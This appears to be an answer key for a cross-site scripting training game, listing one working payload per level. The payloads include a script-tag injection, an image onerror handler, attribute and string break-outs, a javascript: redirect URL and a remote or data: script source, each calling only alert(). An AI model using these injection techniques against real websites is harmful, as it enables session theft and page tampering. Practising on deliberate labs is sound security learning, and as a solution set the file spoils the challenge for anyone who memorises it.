# Level 1
```
https://xss-game.appspot.com/level1/frame?query=<script>alert()</script>
```

# Level 2
```
<img src="no_image.nothing" onerror="alert()">
```

# Level 3
```
https://xss-game.appspot.com/level3/frame#'onerror='alert()'
```

# Level 4
```
');alert('
```

# Level 5
```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()
```

# Level 6
```
https://xss-game.appspot.com/level6/frame#//google.com/jsapi?callback=alert
https://xss-game.appspot.com/level6/frame#data:text/plain,alert()
```
